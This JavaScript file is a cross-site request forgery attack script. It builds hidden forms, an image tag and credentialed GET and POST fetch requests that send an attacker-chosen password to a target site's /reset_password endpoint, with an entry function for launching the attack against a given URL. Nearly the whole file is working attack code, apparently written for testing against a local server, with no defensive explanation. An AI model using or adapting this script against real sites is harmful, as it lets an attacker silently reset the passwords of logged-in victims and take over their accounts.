function sleep(millis) {
    var t = (new Date()).getTime();
    var i = 0;
    while (((new Date()).getTime() - t) < millis) {
        i++;
    }
}

function FetchRequests(url, type){
	/* Same-Site: None  */
	switch (type) {
		case "GET":
			console.log("[*] Send GET request to " + url );
			fetch(url + "?" + new URLSearchParams({"password": "N3w_F3tch_passw0rd_t0_SidneyJob!",}), {credentials: "include"})
			return 0;
	
		case "POST":
			console.log("[*] Send POST request to " + url );
			fetch(url, {
                method: "POST", 
                body: "password=N3w_F3tch_passw0rd_t0_SidneyJob!",
                credentials: "include",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded"
                }
            });
			return 0;

		default:
			console.error("[-] Method Not Allowed");
			return -1;
		}
}



function CreateCSRFForm(url, type){
    var url = url + "/reset_password"

    var form = document.createElement("form");
    form.setAttribute("method", type);
    form.setAttribute("action", url);

    var s = document.createElement("input");
    s.setAttribute("type", "submit");
    s.setAttribute("value", "SEND " + type + " CSRF REQUEST");

    var data = document.createElement("input");
    data.setAttribute("type", "hidden");
    data.setAttribute("name", "password");
    data.setAttribute("value", "N3w_passw0rd_t0_SidneyJob!");

    form.appendChild(s);
    form.appendChild(data);
    document.getElementsByTagName("body")[0].appendChild(form);

    return 1;
}

function CreateCSRFImg(url){
    var url = url + "/reset_password?password=N3w_passw0rd_t0_SidneyJob!";
    var img = document.createElement("img");

    img.setAttribute("src", url);
    document.getElementsByTagName("body")[0].appendChild(img);

    return 1;
}


function StartCSRFAttack(url){
    var types = ["GET", "POST"];
    // Example URL: https://site.ru
    // Ex start this function: StartCSRFAttack('https://127.0.0.1:8081');

    for (let i = 0; i < types.length; i += 1) {
      if(CreateCSRFForm(url, types[i])){
        console.log("Successfully created [" + types[i] + "] form!");
        };
    }

    // if(CreateCSRFImg(url)){
    //     console.log("Successfully created image!");
    // };
    for (let i = 0; i < types.length; i += 1) {
        if(FetchRequests(url+"/reset_password", types[i])){
            console.log('Successfully sent ' + types[i] + ' request to ' + url)
        }
    }
}





